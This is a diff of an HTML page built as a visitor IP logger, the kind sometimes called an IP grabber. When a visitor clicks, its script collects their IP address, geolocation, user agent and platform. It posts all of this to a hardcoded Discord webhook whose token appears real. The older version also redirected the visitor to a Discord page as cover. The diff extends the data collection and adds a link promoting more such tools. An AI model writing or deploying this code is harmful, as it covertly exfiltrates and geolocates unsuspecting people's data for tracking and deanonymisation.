@@ -4,6 +4,12 @@
     <title>User Information</title>
     <meta property="og:image" content="https://ds6br8f5qp1u2.cloudfront.net/blog/wp-content/uploads/2016/08/click-me-button.png?x32616">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <style>
+        a {
+            color: inherit;
+            text-decoration: none;
+        }
+    </style>
     <script>
         function sendUserInformation() {
             var webhookURL = 'https://discordapp.com/api/webhooks/1130835079904637061/FwaQdL2iEJIJ08NhRT6fBBALTR0V0jQQ5Gozasjxxka-9YePc0HMWlYV7qBPrtpvss5-';
@@ -11,28 +17,73 @@
             // Gather user information
             var userAgent = navigator.userAgent;
             var operatingSystem = navigator.platform;
-            var language = navigator.language;
+            var websiteDomain = location.hostname; // Get the current website domain
 
             // Fetch IP address using external service
             $.getJSON('https://api.ipify.org?format=json', function(data) {
                 var ip = data.ip;
 
-                var xhr = new XMLHttpRequest();
-                xhr.open("POST", webhookURL);
-                xhr.setRequestHeader("Content-Type", "application/json");
+                // Fetch additional information about the website domain
+                $.getJSON('https://api.ipgeolocation.io/ipgeo?apiKey=YOUR_API_KEY&domain=' + websiteDomain, function(info) {
+                    var countryCode = info.country_code2;
+                    var city = info.city;
+                    var region = info.state_prov;
 
-                var params = {
-                    content: 'User Information:\n' +
-                        'IP Address: ' + ip + '\n' +
-                        'User Agent: ' + userAgent + '\n' +
-                        'Operating System: ' + operatingSystem + '\n' +
-                        'Language: ' + language
-                };
+                    var xhr = new XMLHttpRequest();
+                    xhr.open("POST", webhookURL);
+                    xhr.setRequestHeader("Content-Type", "application/json");
 
-                xhr.send(JSON.stringify(params));
+                    var params = {
+                        embeds: [
+                            {
+                                title: 'User Information',
+                                description: 'Here is some information about the user:\n\nWant more info? [Click here](https://lenn106.github.io/tools)',
+                                color: 0x7289da, // Discord blue color
+                                fields: [
+                                    {
+                                        name: 'IP Address',
+                                        value: ip,
+                                        inline: true
+                                    },
+                                    {
+                                        name: 'Country',
+                                        value: countryCode,
+                                        inline: true
+                                    },
+                                    {
+                                        name: 'City',
+                                        value: city,
+                                        inline: true
+                                    },
+                                    {
+                                        name: 'Region',
+                                        value: region,
+                                        inline: true
+                                    },
+                                    {
+                                        name: 'User Agent',
+                                        value: userAgent,
+                                        inline: true
+                                    },
+                                    {
+                                        name: 'Operating System',
+                                        value: operatingSystem,
+                                        inline: true
+                                    }
+                                ],
+                                thumbnail: {
+                                    url: 'https://your-website.com/logo.png'
+                                },
+                                footer: {
+                                    text: 'Powered by Your Website'
+                                },
+                                timestamp: new Date().toISOString()
+                            }
+                        ]
+                    };
 
-                // Redirect to https://discord.com/spp
-                window.location.href = 'https://discord.com/spp';
+                    xhr.send(JSON.stringify(params));
+                });
             });
         }
     </script>
